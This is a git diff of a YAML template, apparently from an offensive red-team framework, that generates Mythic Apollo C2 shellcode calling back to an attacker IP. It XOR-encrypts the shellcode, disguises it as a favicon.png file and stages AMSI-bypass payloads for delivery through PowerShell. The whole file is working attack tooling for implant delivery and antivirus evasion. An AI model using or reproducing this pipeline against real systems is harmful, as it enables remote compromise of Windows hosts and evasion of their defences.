@@ -1,31 +1,13 @@
 ---
 metadata:
-  filename: "deliver-windows-x64-mythic-apollo-shellcode-runner-powershell-apc.yaml"
+  filename: "deliver-windows-x64-mythic-apollo-http-shellcode-runner-powershell-apc.yaml"
   tags: ["windows", "c2", "evasion"]
   created: "2026-05-28"
   authors: ["@s3mme", "@TIVKU"]
 
 content: |
   mkdir -p packstation/outbound; \
-  printf '%s\n' 'Mythic generates the shellcode. Please wait...'; \
-  grep 'mythic_api_token' ~/.config/profi/config.yaml | awk '{print $2}' | tr -d '"' > /tmp/mythic_token_tmp; \
-  {{ python_path }} {{ templates_dir }}/helper_scripts/mythicConfigGenerator.py \
-    --payload-type apollo \
-    --callback-host http://{{ attacker_ip }} \
-    --callback-port {{ mythic_callback_port }} \
-    --callback-interval {{ mythic_callback_interval }} \
-    --callback-jitter {{ mythic_callback_jitter }} \
-    --selected-os Windows \
-    --output-type shellcode \
-    --shellcode-format Binary \
-    --killdate {{ mythic_killdate }} \
-    --commands {{ mythic_payload_commands }} | \
-  {{ python_path }} {{ templates_dir }}/helper_scripts/mythicPayloadGenerator.py \
-    --mythic-url {{ mythic_url }} \
-    --api-token-file /tmp/mythic_token_tmp \
-    --stdin \
-    --output packstation/outbound/shellcode.bin && \
-  rm -f /tmp/mythic_token_tmp; \
+  {{ include('scripts/generate-mythic-apollo-http-shellcode.yaml') }} \
   python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png ; \
   sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset.yaml > packstation/outbound/offer1.txt; \
   sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset-2.yaml > packstation/outbound/offer2.txt; \
